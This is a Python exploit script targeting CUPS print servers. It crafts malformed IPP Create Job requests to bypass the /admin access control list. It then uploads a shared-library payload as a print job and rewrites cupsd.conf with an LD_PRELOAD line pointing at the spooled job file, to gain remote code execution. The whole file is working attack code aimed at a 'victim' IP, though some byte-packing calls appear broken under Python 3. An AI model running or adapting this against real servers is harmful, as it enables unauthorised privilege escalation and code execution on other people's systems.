import argparse
import re
import random
import time
from struct import *
import socket
from socket import *
from rich.theme import Theme
from rich.console import Console

custom_theme = Theme({"success":"bold green", "error":"bold red", "info": "blue", "detail":"italic"})
console = Console(theme=custom_theme)
parser = argparse.ArgumentParser(description='Optional app description')

parser.add_argument('--ip', help="the victim cups server ip", required=True)
parser.add_argument('--port', help="victim port (default 631)", default="631")
parser.add_argument('--payload', help="the payload path (.so), if it is present the attack will be executed also for /admin/conf replacement")

args = parser.parse_args()


class TCPSocket:
    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket(
                AF_INET, SOCK_STREAM)
            self.sock.settimeout(30)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, int(port)))

    def send_message(self, msg):
        self.sock.send(msg)

    def receive_message(self):
        tmp = self.sock.recv(1024)
        msg = ""
        while tmp:
            msg += tmp.decode("utf-8")
            tmp = self.sock.recv(1024)
        return msg


def main():
    target_ip = args.ip
    target_port = args.port
    payload_path = args.payload

    console.print("Getting first available printer name...", style="info")
    printer_name = retrieve_printers_connected(target_ip, target_port)

    ######################################################################## PRIVILEGE ESCALATION
    attack_access_control_list(target_ip, target_port, printer_name)

    ########################################################################## CONF REPLACEMENT AND REMOTE CODE EXECUTION
    if payload_path is not None:
        console.print("Payload attack...", style="info")
        payload = binary_payload_to_str_from_path(payload_path)
        job_id = perform_initial_job_request(
            target_ip, target_port, printer_name, payload)
        
        original_config = get_original_configuration(target_ip, target_port)
        new_evil_config = create_evil_configuration(original_config, job_id)

        console.print("Evil payload uploading...", style="info")
        replace_configuration_on_server(
            target_ip, target_port, new_evil_config)

        console.print("Payload attack done!", style="info")
        exit(0)


"""
It sends a GET request to the target's CUPS server, and if it finds a printer, it returns the
printer's name

:param target_ip: the IP address of the target
:param target_port: The port to connect to. Default is 631, defaults to 631 (optional)
:return: The printer name
"""


def retrieve_printers_connected(target_ip, target_port="631"):
    request = "GET /printers HTTP/1.1\r\n" \
              "Host: "+str(target_ip)+":"+str(target_port)+"\r\n" \
              "User-Agent: CUPS/2.0.2\r\n" \
              "Connection: Close\r\n\r\n"

    console.print("\nRequest for printers:\n"+request, style="info")
    request = request.encode('utf-8')

    response = perform_communication_with_socket(
        target_ip, int(target_port), request)

    if response is not None:
        # console.print(response)
        message = re.search(
            '<TR><TD><A HREF="(.+)">.+</A></TD><TD>.*</TD><TD>.*</TD><TD>.*</TD><TD>', response)
        if message is not None:
            printer = message.group(1)
            console.print("Printer found! " + printer, style="success")
            return printer

    console.print('No printers found', style="error")
    exit(1)

    
"""
> The function performs an ACL attack by deallocating the printer's admin and configuration strings,
and then checks if the attack was successful

:param target_ip: the IP address of the printer
:param target_port: The port of the printer you want to attack
:param printer: the name of the printer
"""
def attack_access_control_list(target_ip, target_port, printer):
    console.print("ACL attack...", style="info")
    i = random.randint(1, 1024)
    printer_url = "ipp://" + target_ip + ":" + target_port + printer

    perform_admin_deallocation(target_ip, target_port, printer, i, printer_url)
    time.sleep(1)

    perform_admin_conf_deallocation(target_ip, target_port, printer, i, printer_url)

    check_acl_attack_result(target_ip, target_port)

"""
It checks if the ACL attack was successful.

:param target_ip: The IP address of the target printer
:param target_port: The port of the target
"""
def check_acl_attack_result(target_ip, target_port):
    http_header_check = "GET /admin HTTP/1.1\r\n"\
                        "Host: " + target_ip + ":" + target_port + "\r\n"\
                        "User-Agent: CUPS/2.0.2\r\n"\
                        "Connection: Close\r\n\r\n"

    console.print("Checking if attack on /admin/conf works", style="info")

    check_message_result = perform_communication_with_socket(
        target_ip, target_port, http_header_check.encode('utf-8'))

    if '200 OK' in check_message_result:
        console.print("Access Control List attack successful, you have the access now to /admin and /admin/conf", style="success")
    else:
        console.print("ACL attack failed\n", style="error")
        exit(1)

    
    """
    It sends a POST request to the printer's IPP port with a payload that contains a string of
    characters that will be used to deallocate /admi/conf string in CUPS
    
    :param target_ip: The IP address of the target printer
    :param target_port: The port of the target printer
    :param printer: The printer name
    :param i: a random number
    :param printer_url: The URL of the printer
    """
def perform_admin_conf_deallocation(target_ip, target_port, printer, i, printer_url):
    string_to_dealloc = "/admin/conf"
    admin_configuration_payload = ("\x02\x00"        #   vers 2.0
                "\x00\x05"+     #   op id: Create Job (0x0005)
                str(pack(">i",(i+2)))+
                "\x01"      #   op attributes marker
                "\x47"      #   charset
                "\x00\x12"      #   name len: 18
                "attributes-charset"
                "\x00\x08"      #   val len: 8
                "us-ascii"
                "\x48"      #   natural language
                "\x00\x1b"      #   name len: 27
                "attributes-natural-language"
                "\x00\x0b"      #   val len: 11
                "/admin/conf"
                "\x45"      #   printer-uri
                "\x00\x0b"      #   name len 11
                "printer-uri" +
                str(pack(">h", len(printer_url))) + printer_url +
                "\x42"      #   name without lang
                "\x00\x14"      #   name len: 20
                "requesting-user-name"
                "\x00\x0b"      #   val len: 11
                "/admin/conf"
                "\x02"      #   job attrs marker
                "\x21"      #   integer
                "\x00\x06"      #   name len: 6
                "copies"
                "\x00\x04"      #   val len: 4
                "\x00\x00\x00\x01"  #   1
                "\x42"      #   name w/o lang
                "\x00\x19"      #   name len: 25
                "job-originating-host-name"
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x36"      #   nwl
                "\x00\x00"      #   name len: 0
                "\x00\x1b"      #   val len: 27
                "\x00\x0b"      #   length
                "/admin/conf"
                "\x00\x0c"
                "BBBBBBBBBBBB"
                "\x03")      #   end of attributes
    http_admin_conf_uri_header = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + target_ip + ":" + target_port + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Close\x0d\x0a"
                    "Content-Length: " + str(len(admin_configuration_payload)) + "\x0d\x0a"
                    "\x0d\x0a")

    
    console.print("admin/conf attack response:\n" + 
        perform_communication_with_socket(target_ip,target_port,(http_admin_conf_uri_header + admin_configuration_payload).encode('utf-8')), style="detail")

"""
    It sends a POST request to the printer's IPP port with a payload that contains a string of
    characters that will be used to deallocate /admi/conf string in CUPS
    
    :param target_ip: The IP address of the target printer
    :param target_port: The port of the target printer
    :param printer: The printer name
    :param i: a random number
    :param printer_url: The URL of the printer
    """
def perform_admin_deallocation(target_ip, target_port, printer, i, printer_url):
    string_to_dealloc = "/admin"
    admin_payload =("\x02\x00"      #   vers 2.0
                "\x00\x05"+     #   op id: Create Job (0x0005)
                str(pack(">i",(i+1)))+
                "\x01"      #   op attributes marker
                "\x47"      #   charset
                "\x00\x12"      #   name len: 18
                "attributes-charset"
                "\x00\x08"      #   val len: 8
                "us-ascii"
                "\x48"      #   natural language
                "\x00\x1b"      #   name len: 27
                "attributes-natural-language"
                "\x00\x06"      #   val len: 6
                "/admin"
                "\x45"      #   printer-uri
                "\x00\x0b"      #   name len 11
                "printer-uri" +
                str(pack(">h", len(printer_url))) + printer_url +
                "\x42"      #   name without lang
                "\x00\x14"      #   name len: 20
                "requesting-user-name"
                "\x00\x06"      #   val len: 6
                "/admin"
                "\x02"      #   job attrs marker
                "\x21"      #   integer
                "\x00\x06"      #   name len: 6
                "copies"
                "\x00\x04"      #   val len: 4
                "\x00\x00\x00\x01"  #   1
                "\x42"      #   name w/o lang
                "\x00\x19"      #   name len: 25
                "job-originating-host-name"
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x42"      #   nwol
                "\x00\x00"      #   name len: 0
                "\x00\x0c"      #   val len: 12
                "AAAAAAAAAAAA"
                "\x36"      #   nwl
                "\x00\x00"      #   name len: 0
                "\x00\x16"      #   val len: 22
                "\x00\x06"      #   length
                "/admin"
                "\x00\x0c"
                "BBBBBBBBBBBB"
                "\x03")      #   end of attributes

    http_admin_uri_header = ("POST " + printer + " HTTP/1.1\x0d\x0a"
                    "Content-Type: application/ipp\x0d\x0a"
                    "Host: " + target_ip + ":" + target_port + "\x0d\x0a"
                    "User-Agent: CUPS/2.0.2\x0d\x0a"
                    "Connection: Close\x0d\x0a"
                    "Content-Length: " + str(len(admin_payload)) + "\x0d\x0a"
                    "\x0d\x0a")

    console.print("admin/ attack response <:\n" + 
        perform_communication_with_socket(target_ip,target_port,(http_admin_uri_header + admin_payload).encode('utf-8')), style="detail")

"""
It takes a path to a binary file and returns the binary data as a string

:param payload_path: the path to the binary file you want to send
:type payload_path: str
:return: The payload is being returned.
"""
def binary_payload_to_str_from_path(payload_path):
    payload = None
    # opening a binary file
    with open(payload_path, 'rb') as f:
        payload = f.read()
    if payload is not None:
        console.print("Payload is ok, executing attack", style="success")
    else:
        console.print("Problem with the payload you choose", style="error")
    return payload


"""
It sends a create job request to the target printer, then it sends it to the target
printer, and then it returns created the job id 

:param target_ip: the IP address of the target
:param target_port: The port that the CUPS server is listening on
:param printer: the printer name
:param payload: the payload to be sent to the target
:return: The job id
"""
def perform_initial_job_request(target_ip, target_port, printer, payload):
    i = random.randint(1, 3)
    request_id_job = str(pack(">i", (i + 2)))
   
    job_id = '1'

    printer_uri = "ipp://" + target_ip + ":" + str(target_port) + printer

    job_packet = ("\x02\x00"
                "\x00\x05"+
                request_id_job+
                "\x01"
                "\x47"+"\x00\x12"+"attributes-charset"+"\x00\x05"+"utf-8"
                "\x48"+"\x00\x1b"+"attributes-natural-language"+"\x00\x05"+"en-us"
                "\x45"+"\x00\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +
                "\x42"+"\x00\x14"+"requesting-user-name"+"\x00\x04"+"root"
                "\x42"+"\x00\x08"+"job-name"+"\x00\x06"+"badlib"
                "\x02"
                "\x21"+"\x00\x06"+"copies"+"\x00\x04"+"\x00\x00\x00\x01"
                "\x23"+"\x00\x0a"+"finishings"+"\x00\x04"+"\x00\x00\x00\x03"
                "\x42"+"\x00\x10"+"job-cancel-after"+"\x00\x05"+"\x31\x30\x38\x30\x30"
                "\x44"+"\x00\x0e"+"job-hold-until"+"\x00\x0a"+"indefinite"
                "\x21"+"\x00\x0c"+"job-priority"+"\x00\x04"+"\x00\x00\x00\x32"
                "\x42"+"\x00\x0a"+"job-sheets"+"\x00\x04"+"none"+"\x42"+"\x00\x00\x00\x04"+"none"
                "\x21"+"\x00\x09"+"number-up"+"\x00\x04"+"\x00\x00\x00\x01"
                "\x03")

    http_header_job_request = ("POST " + printer + " HTTP/1.1\r\n"
                                                   "Content-Type: application/ipp\r\n"
                                                   "Host: " + target_ip + ":" +
                               str(target_port) + "\r\n"
                                                  "User-Agent: CUPS/2.0.2\r\n"
                                                  "Connection: Close\r\n"
                                                  "Content-Length: " +
                               str(len(job_packet)) + "\r\n"
                                                          "\r\n")

    job_request = http_header_job_request + job_packet
    response_job_request = perform_communication_with_socket(
        target_ip, int(target_port), job_request.encode('utf-8'))

    if response_job_request is not None:
        response_check_str = re.search("ipp://" + target_ip + ":" +
                                       str(target_port) + "/jobs/(\d+)", response_job_request)
        if response_check_str is not None:
            job_id = response_check_str.group(1)
    else:
        console.print("Problem with the job request", style="error")
        exit(1)


    print_request_id = str(pack(">i", (i + 3)))
    document_to_print_packet = ("\x02\x00"
                                "\x00\x06"+
                                print_request_id+
                                "\x01"
                                "\x47"+"\x00\x12"+"attributes-charset"+"\x00\x05"+"utf-8"
                                "\x48"+"\x00\x1b"+"attributes-natural-language"+"\x00\x05"+"en-us"
                                "\x45"+"\x00\x0b"+"printer-uri" + str(pack(">h", len(printer_uri))) + printer_uri +
                                "\x21"+"\x00\x06"+"job-id"+"\x00\x04"+ str(pack(">i", int(job_id))) +
                                "\x42"+"\x00\x14"+"requesting-user-name"+"\x00\x04"+"root"
                                "\x42"+"\x00\x0d"+"document-name"+"\x00\x06"+"badlib"
                                "\x49"+"\x00\x0f"+"document-format"+"\x00\x18"+"application/octet-stream"
                                "\x22"+"\x00\x0d"+"last-document"+"\x00\x01"+"\x01"
                                "\x03"+
                                str(payload))
    print_request_http_header = ("POST " + printer + " HTTP/1.1\r\n"
                                                     "Content-Type: application/ipp\r\n"
                                                     "Host: " + target_ip + ":" +
                                 str(target_port) + "\r\n"
                                                    "User-Agent: CUPS/2.0.2\r\n"
                                                    "Connection: Close\r\n"
                                                    "Content-Length: " +
                                 str(len(document_to_print_packet) + 0) +
                                 "\r\n"
                                 "\r\n")

    print_request = print_request_http_header + document_to_print_packet
    print_response = perform_communication_with_socket(
        target_ip, int(target_port), print_request.encode('utf-8'))
    return job_id


"""
It sends a request to the target server to obtain the original configuration file

:param target_ip: The IP address of the target
:param target_port: The port that the CUPS service is running on
:return: The original configuration file.
"""


def get_original_configuration(target_ip, target_port):
    i = random.randint(1, 1024)
    original_config = ""
    http_request = ("GET /admin/conf/cupsd.conf HTTP/1.1\r\n"
                    "Host: " + target_ip + ":" + target_port + "\r\n"
                    "User-Agent: CUPS/2.0.2\r\n"
                    "Connection: Close\r\n\r\n")

    console.print("Obtaining original configuration file...", style="info")
    response = perform_communication_with_socket(
        target_ip, target_port, http_request.encode('utf-8'))
    response_array = response.split("\r\n\r\n")
    original_config = response_array[1]
    console.print("Configuration file:\n" + original_config + "\n", style="info")
    return original_config


"""
It takes a string, appends two newlines, and then appends a string that contains the name of the
file we want to create

:param config: The configuration file to be modified
:param name: The name of the printer
:return: The configuration file with the evil configuration appended to it.
"""


def create_evil_configuration(config, name):
    config = config + "\n\nSetEnv LD_PRELOAD /var/spool/cups/d000" + name + "-001\n"
    return config


"""
It takes a string, converts each character to hex, and then creates a visualization of the hex and
ASCII characters

:param input_str: The string that you want to visualize
:type input_str: str
:return: A string that is a visual representation of the hex and ascii values of the input string.
"""


def create_visualization_message(input_str):
    hex_encoded_chars = []
    ascii_message_visualization = []
    final_message = ''
    char_list = list(input_str)

    for char in char_list:
        hex_encoded_chars.append(char.encode("hex"))
        if char == '0x0':
            ascii_message_visualization.append('0')
        elif 30 > ord(char) or ord(char) > 128:
            ascii_message_visualization.append('..')
        elif 30 < ord(char) or ord(char) < 128:
            ascii_message_visualization.append(char)

    i = 0
    while i < len(hex_encoded_chars):
        if (len(hex_encoded_chars) - i) >= 16:
            final_message += ' '.join(hex_encoded_chars[i:i + 16])
            final_message += "         "
            final_message += ' '.join(ascii_message_visualization[i:i + 16])
            final_message += "\n"
            i = i + 16
        else:
            final_message += ' '.join(
                hex_encoded_chars[i:(len(hex_encoded_chars) - 0)])
            pad = len(
                ' '.join(hex_encoded_chars[i:(len(hex_encoded_chars) - 0)]))
            final_message += ' ' * (56 - pad)
            final_message += ' '.join(
                ascii_message_visualization[i:(len(hex_encoded_chars) - 0)])
            final_message += "\n"
            i = i + len(hex_encoded_chars)

    return final_message


"""
> This function takes an IP address, a port, a protocol, and a packet to send, and returns a
response packet

:param ip: the ip address of the server
:param port: The port number to connect to
:param protocol: The protocol to use
:type protocol: str
:param packet_to_send: This is the packet that you want to send to the server
:return: The response packet
"""


def perform_communication_with_socket(ip, port, packet_to_send):
    sock = TCPSocket()
    sock.connect(ip, port)

    sock.send_message(packet_to_send)
    response_packet = sock.receive_message()
    return response_packet


"""
It sends a PUT request to the CUPS server, which contains the configuration file that we want to
upload

:param target_ip: The IP address of the target server
:param target_port: The port that the CUPS server is listening on
:param config: The configuration file to upload to the server
"""


def replace_configuration_on_server(target_ip, target_port, config):
    http_request = ("PUT /admin/conf/cupsd.conf HTTP/1.1\r\n"
                    "Content-Type: application/ipp\r\n"
                    "Host: " + target_ip + ":" + target_port + "\r\n"
                                                               "User-Agent: CUPS/2.0.2\r\n"
                                                               "Connection: Keep-Alive\r\n"
                                                               "Content-Length: " +
                    str(len(config)) + "\r\n"
                    "\r\n")
    console.print("Uploading evil configuration on server...", style="info")
    
    console.print("Response <:\n" + perform_communication_with_socket(target_ip,
                                                              target_port,
                                                              (http_request + config).encode('utf-8')), style="detail")


if __name__ == "__main__":
    main()
